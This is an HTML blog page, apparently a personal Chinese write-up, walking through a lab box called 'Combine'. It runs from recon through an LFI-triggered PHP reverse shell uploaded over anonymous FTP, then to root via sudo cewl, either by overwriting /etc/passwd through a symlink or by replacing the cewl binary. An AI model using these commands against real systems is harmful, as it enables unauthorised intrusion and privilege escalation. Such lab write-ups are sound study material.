@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html data-color-mode="light" data-dark-theme="github-light" data-light-theme="light" lang="zh-CN">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="content-type" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href='https://7r1UMPHK.github.io/css/primer.css' rel='stylesheet' />
+    <script src='https://7r1UMPHK.github.io/plugins/theme.js'></script><script data-goatcounter='https://7r1umphk.goatcounter.com/count' async src='https://7r1UMPHK.github.io/plugins/count.js'></script>
+    <link rel="icon" href="https://7r1UMPHK.github.io/image/20250320200557660.ico">
+<meta name="description" content="### **一、信息收集**
+
+首先，在目标网段内使用`arp-scan`进行主机发现，确定目标主机的IP地址。">
+<meta property="og:title" content="内部_Combine">
+<meta property="og:description" content="### **一、信息收集**
+
+首先，在目标网段内使用`arp-scan`进行主机发现，确定目标主机的IP地址。">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://7r1UMPHK.github.io/post/nei-bu-_Combine.html">
+<meta property="og:image" content="https://7r1umphk.github.io/image/20250716100121947.webp">
+<title>内部_Combine</title>
+<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
+
+</head>
+<style>
+body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;padding: 45px;font-size: 16px;font-family: sans-serif;line-height: 1.25;}
+#header{display:flex;padding-bottom:8px;border-bottom: 1px solid var(--borderColor-muted, var(--color-border-muted));margin-bottom: 16px;}
+#footer {margin-top:64px; text-align: center;font-size: small;}
+
+</style>
+
+<style>
+.postTitle{margin: auto 0;font-size:40px;font-weight:bold;}
+.title-right{display:flex;margin:auto 0 0 auto;}
+.title-right .circle{padding: 14px 16px;margin-right:8px;}
+#postBody{border-bottom: 1px solid var(--color-border-default);padding-bottom:36px;}
+#postBody hr{height:2px;}
+#cmButton{height:48px;margin-top:48px;}
+#comments{margin-top:64px;}
+.g-emoji{font-size:24px;}
+@media (max-width: 600px) {
+    body {padding: 8px;}
+    .postTitle{font-size:24px;}
+}
+.copy-feedback {
+    display: none;
+    position: absolute;
+    top: 10px;
+    right: 50px;
+    color: var(--color-fg-on-emphasis);
+    background-color: var(--color-fg-muted);
+    border-radius: 3px;
+    padding: 5px 8px;
+    font-size: 12px;
+}
+</style>
+
+
+
+
+<body>
+    <div id="header">
+<h1 class="postTitle">内部_Combine</h1>
+<div class="title-right">
+    <a href="https://7r1UMPHK.github.io" id="buttonHome" class="btn btn-invisible circle" title="首页">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathHome" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+    <a href="https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/264" target="_blank" class="btn btn-invisible circle" title="Issue">
+        <svg class="octicon" width="16" height="16">
+            <path id="pathIssue" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+    
+
+    <a class="btn btn-invisible circle" onclick="modeSwitch();" title="切换主题"style="display:none;">
+        <svg class="octicon" width="16" height="16" >
+            <path id="themeSwitch" fill-rule="evenodd"></path>
+        </svg>
+    </a>
+
+</div>
+</div>
+    <div id="content">
+<div class="markdown-body" id="postBody"><h3><strong>一、信息收集</strong></h3>
+<p>首先，在目标网段内使用<code class="notranslate">arp-scan</code>进行主机发现，确定目标主机的IP地址。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ sudo arp-scan -l
+...
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
+192.168.205.2   00:50:56:e0:e6:bb       VMware, Inc.
+192.168.205.252 08:00:27:34:89:3e       PCS Systemtechnik GmbH
+192.168.205.254 00:50:56:ec:fc:46       VMware, Inc.
+...</pre></div>
+<p>发现目标主机IP为 <code class="notranslate">192.168.205.252</code>。</p>
+<p>接下来，使用<code class="notranslate">nmap</code>对目标主机进行全端口扫描，以探测其开放的服务。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nmap -p0-65535 192.168.205.252
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-11 20:14 CST
+Nmap scan report <span class="pl-k">for</span> 192.168.205.252
+Host is up (0.00018s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:34:89:3E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 1.40 seconds<span class="pl-s"><span class="pl-pds">`</span><span class="pl-pds">`</span><span class="pl-pds">`</span></span></pre></div>
+<p>扫描结果显示，目标主机开放了21 (FTP)、22 (SSH) 和 80 (HTTP) 端口。</p>
+<h3><strong>二、漏洞发现与利用</strong></h3>
+<h4><strong>1. FTP匿名登录与信息泄露</strong></h4>
+<p>尝试对FTP服务进行匿名登录。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ ftp anonymous@192.168.205.252
+Connected to 192.168.205.252.
+220 (vsFTPd 3.0.3)
+230 Login successful.
+Remote system <span class="pl-c1">type</span> is UNIX.
+Using binary mode to transfer files.
+ftp<span class="pl-k">&gt;</span> ls
+...
+drwxrwxrwx    2 65534    65534        4096 Oct 11 12:13 upload
+...
+ftp<span class="pl-k">&gt;</span> <span class="pl-c1">cd</span> upload
+250 Directory successfully changed.
+ftp<span class="pl-k">&gt;</span> ls -al
+...
+-rw-r--r--    1 0        0              16 Oct 10 13:08 .pwd
+...
+ftp<span class="pl-k">&gt;</span> get .pwd
+...
+226 Transfer complete.
+16 bytes received <span class="pl-k">in</span> 00:00 (24.14 KiB/s)</pre></div>
+<p>成功匿名登录FTP，发现一个名为<code class="notranslate">upload</code>的目录，且权限为777（可读可写可执行）。在该目录下，发现一个隐藏文件<code class="notranslate">.pwd</code>，下载后查看其内容。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ cat -A .pwd
+/srv/ftp/upload$</pre></div>
+<p>文件内容为路径<code class="notranslate">/srv/ftp/upload</code>，这很可能是FTP <code class="notranslate">upload</code>目录在服务器上的绝对路径。这个信息对后续利用LFI漏洞至关重要。</p>
+<h4><strong>2. Web服务LFI漏洞</strong></h4>
+<p>访问80端口的Web服务。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl -v 192.168.205.252
+...
+<span class="pl-k">&lt;</span><span class="pl-k">!</span>-- LFI --<span class="pl-k">&gt;</span>
+...</pre></div>
+<p>页面返回的HTML注释中存在<code class="notranslate">&lt;!-- LFI --&gt;</code>，强烈暗示该页面存在本地文件包含（Local File Inclusion）漏洞。使用<code class="notranslate">ffuf</code>工具对URL参数进行模糊测试，尝试读取<code class="notranslate">/etc/passwd</code>文件。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ ffuf -u <span class="pl-s"><span class="pl-pds">'</span>http://192.168.205.252?FUZZ=....//....//....//etc/passwd<span class="pl-pds">'</span></span> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --fs 14
+...
+file                    [Status: 200, Size: 1465, Words: 16, Lines: 30, Duration: 2ms]
+...
+</pre></div>
+<p>爆破成功，发现存在一个名为<code class="notranslate">file</code>的参数可用于文件包含。</p>
+<h4><strong>3. 获取反向Shell</strong></h4>
+<p>利用思路是：通过FTP上传一个PHP反向Shell到具有写权限的<code class="notranslate">upload</code>目录，然后通过LFI漏洞包含并执行该PHP文件，从而获取服务器的Shell。</p>
+<p><strong>a. 准备反向Shell并监听端口</strong></p>
+<p>在Kali上准备好<code class="notranslate">reverse.php</code>文件，并使用<code class="notranslate">nc</code>监听8888端口。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nc -lvnp 8888
+listening on [any] 8888 ...</pre></div>
+<p><strong>b. FTP上传Shell</strong></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ ftp anonymous@192.168.205.252
+...
+230 Login successful.
+ftp<span class="pl-k">&gt;</span> <span class="pl-c1">cd</span> upload
+250 Directory successfully changed.
+ftp<span class="pl-k">&gt;</span> put reverse.php
+...
+226 Transfer complete.</pre></div>
+<p><strong>c. 触发Shell</strong></p>
+<p>利用之前发现的LFI漏洞和FTP泄露的绝对路径，构造URL来执行<code class="notranslate">reverse.php</code>。使用<code class="notranslate">--path-as-is</code>选项防止<code class="notranslate">curl</code>对路径中的<code class="notranslate">../</code>进行标准化处理。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ curl --path-as-is <span class="pl-s"><span class="pl-pds">'</span>http://192.168.205.252?file=....//....//....//srv/ftp/upload/reverse.php<span class="pl-pds">'</span></span></pre></div>
+<p><strong>d. 接收Shell</strong></p>
+<p>回到<code class="notranslate">nc</code>监听窗口，成功接收到反向Shell。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
+└─$ nc -lvnp 8888
+listening on [any] 8888 ...
+connect to [192.168.205.128] from (UNKNOWN) [192.168.205.252] 43474
+Linux Combine 4.19.0-27-amd64 <span class="pl-c"><span class="pl-c">#</span>1 SMP Debian 4.19.316-1 (2024-06-25) x86_64 GNU/Linux</span>
+...
+www-data@Combine:/$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre></div>
+<p>当前用户为<code class="notranslate">www-data</code>。为了方便操作，使用以下命令升级为一个稳定的交互式TTY Shell。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">script /dev/null -c bash
+Ctrl+Z
+stty raw -echo<span class="pl-k">;</span> <span class="pl-c1">fg</span>
+reset xterm
+<span class="pl-k">export</span> TERM=xterm
+<span class="pl-k">export</span> SHELL=/bin/bash
+stty rows 36 columns 178</pre></div>
+<h3><strong>三、权限提升</strong></h3>
+<h4><strong>1. www-data -&gt; dashamao</strong></h4>
+<p>在<code class="notranslate">www-data</code>用户下进行信息收集。在<code class="notranslate">/home/dashamao</code>目录下发现<code class="notranslate">note.txt</code>文件。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Combine:/home/dashamao$ cat note.txt
+check backup folder</pre></div>
+<p>根据提示，检查<code class="notranslate">/var/backups</code>目录，发现一个可疑文件<code class="notranslate">apt.extended_states</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Combine:/var/backups$ ls -al
+...
+-rw-r--r--  1 root root    18 Oct 10 09:11 apt.extended_states
+...
+www-data@Combine:/var/backups$ cat apt.extended_states
+dashamao:myshadow</pre></div>
+<p>该文件泄露了用户<code class="notranslate">dashamao</code>的凭证。使用<code class="notranslate">su</code>命令和这个密码切换到<code class="notranslate">dashamao</code>用户。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">www-data@Combine:/var/backups$ su dashamao
+Password: myshadow
+dashamao@Combine:<span class="pl-k">~</span>$ id
+uid=1000(dashamao) gid=1000(dashamao) groups=1000(dashamao)</pre></div>
+<p>成功切换为<code class="notranslate">dashamao</code>用户。</p>
+<h4><strong>2. dashamao -&gt; root</strong></h4>
+<p>检查<code class="notranslate">dashamao</code>用户的<code class="notranslate">sudo</code>权限。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">dashamao@Combine:<span class="pl-k">~</span>$ sudo -l
+...
+User dashamao may run the following commands on Combine:
+    (ALL) NOPASSWD: /usr/bin/cewl</pre></div>
+<p>发现<code class="notranslate">dashamao</code>可以免密码以root权限执行<code class="notranslate">/usr/bin/cewl</code>命令。<code class="notranslate">cewl</code>是一个爬取网站并生成密码字典的工具。这为提权提供了两种可行的方法。</p>
+<p><strong>方法一：利用<code class="notranslate">cewl</code>的元数据写入功能覆盖<code class="notranslate">/etc/passwd</code></strong></p>
+<p><code class="notranslate">cewl</code>在使用<code class="notranslate">--meta</code>和<code class="notranslate">--keep</code>参数时，会下载文件并将其保存在<code class="notranslate">--meta-temp-dir</code>指定的目录中。我们可以利用这个特性，结合符号链接，来覆盖任意文件。</p>
+<div class="highlight highlight-source-ruby"><pre class="notranslate"><span class="pl-c"># cewl.rb 中的相关源码片段</span>
+
+<span class="pl-c"># ... (前面是处理HTTP请求的代码) ...</span>
+
+<span class="pl-c"># 检查用户是否传递了 --meta 参数</span>
+<span class="pl-k">if</span> <span class="pl-en">meta</span>
+  <span class="pl-k">begin</span>
+    <span class="pl-c"># 接着检查是否同时传递了 --keep 参数，并且文件扩展名是否在预设的列表中 (如.doc, .pdf等)</span>
+    <span class="pl-c"># 这就是为什么我们将符号链接命名为 aaa.doc 来绕过这个检查</span>
+    <span class="pl-k">if</span> <span class="pl-en">keep</span> &amp;&amp; <span class="pl-en">file_extension</span> =~ <span class="pl-sr">/^((doc|dot|ppt|pot|xls|xlt|pps)[xm]?)|(ppam|xlsb|xlam|pdf|zip|gz|zip|bz2)$/</span>
+      
+      <span class="pl-c"># 使用正则表达式从完整的URL (a_url) 中提取文件名部分</span>
+      <span class="pl-k">if</span> <span class="pl-sr">/.*<span class="pl-cce">\/</span>(.*)$/</span><span class="pl-kos">.</span><span class="pl-en">match</span><span class="pl-kos">(</span><span class="pl-en">a_url</span><span class="pl-kos">)</span>
+        <span class="pl-c"># 从URL中匹配到的文件名部分会被存入变量 $1 (例如，从"http://.../aaa.doc"中提取出"aaa.doc")</span>
+        
+        <span class="pl-c"># 漏洞触发的核心代码：</span>
+        <span class="pl-c"># 它将用户指定的临时目录(meta_temp_dir)与从URL中提取的文件名($1)直接进行字符串拼接，</span>
+        <span class="pl-c"># 从而构造出最终要写入的本地文件路径。程序没有检查文件名是否为一个符号链接。</span>
+        <span class="pl-s1">output_filename</span> <span class="pl-c1">=</span> <span class="pl-en">meta_temp_dir</span> + $1 
+        
+        <span class="pl-c"># 如果启用了详细模式(verbose)，则打印出将要保存的文件路径</span>
+        <span class="pl-en">puts</span> <span class="pl-s">"Keeping <span class="pl-s1"><span class="pl-kos">#{</span><span class="pl-s1">output_filename</span><span class="pl-kos">}</span></span>"</span> <span class="pl-k">if</span> <span class="pl-en">verbose</span>
+
+        <span class="pl-c"># ... (一些备用的文件名生成逻辑) ...</span>
+
+        <span class="pl-c"># 以二进制写模式('wb')打开上面构造好的文件路径。</span>
+        <span class="pl-c"># 由于 output_filename 指向一个符号链接，操作系统会自动将写入操作重定向到链接的真实目标文件(/etc/passwd)。</span>
+        <span class="pl-v">File</span><span class="pl-kos">.</span><span class="pl-en">open</span><span class="pl-kos">(</span><span class="pl-s1">output_filename</span><span class="pl-kos">,</span> <span class="pl-s">'wb'</span><span class="pl-kos">)</span> <span class="pl-k">do</span> |<span class="pl-s1">f</span>|
+          <span class="pl-c"># 将从我们HTTP服务器上下载到的文件内容(resp.body)写入到打开的文件中。</span>
+          <span class="pl-s1">f</span><span class="pl-kos">.</span><span class="pl-en">write</span><span class="pl-kos">(</span><span class="pl-en">resp</span><span class="pl-kos">.</span><span class="pl-en">body</span><span class="pl-kos">)</span>
+        <span class="pl-k">end</span>
+        
+        <span class="pl-c"># ... (后面是尝试从下载的文件中提取元数据的代码) ...</span>
+
+      <span class="pl-k">end</span>
+    <span class="pl-k">end</span>
+  <span class="pl-k">rescue</span> <span class="pl-c1">=&gt;</span> <span class="pl-en">e</span>
+    <span class="pl-c"># 异常处理</span>
+    <span class="pl-en">puts</span> <span class="pl-s">"错误: 无法处理元数据 <span class="pl-s1"><span class="pl-kos">#{</span><span class="pl-en">a_url</span><span class="pl-kos">}</span></span> - <span class="pl-s1"><span class="pl-kos">#{</span><span class="pl-en">e</span><span class="pl-kos">.</span><span class="pl-en">message</span><span class="pl-kos">}</span></span>"</span> <span class="pl-k">if</span> <span class="pl-en">verbose</span>
+  <span class="pl-k">end</span>
+<span class="pl-k">end</span></pre></div>
+<p><strong>思路：</strong> 在目标机上创建一个指向<code class="notranslate">/etc/passwd</code>的符号链接<code class="notranslate">aaa.doc</code>。然后在攻击机上创建一个包含新root用户条目的<code class="notranslate">aaa.doc</code>文件，并通过<code class="notranslate">cewl</code>的下载功能将攻击机上的文件内容写入目标机的<code class="notranslate">/etc/passwd</code>。</p>
+<p><strong>a. 攻击机操作</strong></p>
+<p>创建一个包含新root用户<code class="notranslate">b</code>（密码为<code class="notranslate">abcdefg</code>）的<code class="notranslate">passwd</code>文件，并启动一个HTTP服务。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>b:$1$AydoDDh4$tEky6m30.0nY3HZ8FgoGI0:0:0::/root:/bin/bash<span class="pl-pds">'</span></span> <span class="pl-k">&gt;&gt;</span> aaa.doc
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</pre></div>
+<p><strong>b. 目标机操作</strong></p>
+<p>创建符号链接，并执行<code class="notranslate">sudo cewl</code>命令，从攻击机下载文件并覆盖<code class="notranslate">/etc/passwd</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">dashamao@Combine:<span class="pl-k">~</span>$ ln -sf /etc/passwd aaa.doc
+dashamao@Combine:<span class="pl-k">~</span>$ sudo /usr/bin/cewl http://192.168.205.128/aaa.doc --meta --keep --meta-temp-dir /home/dashamao/
+...
+processing file: /home/dashamao/aaa.doc</pre></div>
+<p><strong>c. 提权成功</strong></p>
+<p>检查<code class="notranslate">/etc/passwd</code>文件，确认新用户已添加。然后使用新用户<code class="notranslate">b</code>和密码<code class="notranslate">abcdefg</code>切换到root。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">dashamao@Combine:<span class="pl-k">~</span>$ tail -1 /etc/passwd
+b:<span class="pl-smi">$1</span><span class="pl-smi">$AydoDDh4$tEky6m30</span>.0nY3HZ8FgoGI0:0:0::/root:/bin/bash
+dashamao@Combine:<span class="pl-k">~</span>$ su b
+Password: abcdefg
+root@Combine:/home/dashamao# id
+uid=0(root) gid=0(root) groups=0(root)</pre></div>
+<p><strong>方法二：利用<code class="notranslate">cewl</code>的写文件功能覆盖自身</strong></p>
+<p><code class="notranslate">cewl</code>的<code class="notranslate">-w</code>参数可以将爬取到的单词列表写入指定文件。因为我们能以root权限运行<code class="notranslate">cewl</code>，所以我们可以指定输出文件为<code class="notranslate">/usr/bin/cewl</code>本身，从而覆盖它。</p>
+<p><strong>思路：</strong> 在攻击机上创建一个内容为<code class="notranslate">bash</code>的文件。然后使用<code class="notranslate">sudo cewl</code>从攻击机获取这个"单词"并使用<code class="notranslate">-w</code>参数将其写入<code class="notranslate">/usr/bin/cewl</code>。这样，<code class="notranslate">/usr/bin/cewl</code>就变成了一个内容为<code class="notranslate">bash</code>的脚本。再次以root权限执行它，就会得到一个root shell。</p>
+<p><strong>a. 攻击机操作</strong></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ <span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">'</span>bash<span class="pl-pds">'</span></span><span class="pl-k">&gt;</span>a
+┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...</pre></div>
+<p><strong>b. 目标机操作</strong></p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">dashamao@Combine:<span class="pl-k">~</span>$ sudo /usr/bin/cewl http://192.168.205.128/a -w /usr/bin/cewl
+...
+dashamao@Combine:<span class="pl-k">~</span>$ cat /usr/bin/cewl
+bash</pre></div>
+<p><strong>c. 提权成功</strong></p>
+<p>再次执行<code class="notranslate">sudo /usr/bin/cewl</code>。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">dashamao@Combine:<span class="pl-k">~</span>$ sudo /usr/bin/cewl
+root@Combine:/home/dashamao# id
+uid=0(root) gid=0(root) groups=0(root)</pre></div>
+<p>成功获取root权限。最后，读取flag文件。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">root@Combine:/home/dashamao# cat /root/root.txt /home/dashamao/user.txt
+flag{root-21c4f16ae4ebe48cfec8a6deb276b56b}
+flag{user-4682ce07477fb95a0d4a9f84856ee52c}</pre></div></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPHK.github.io">TriumphK Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek main https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.disabled=true;
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPHK/7r1UMPHK.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
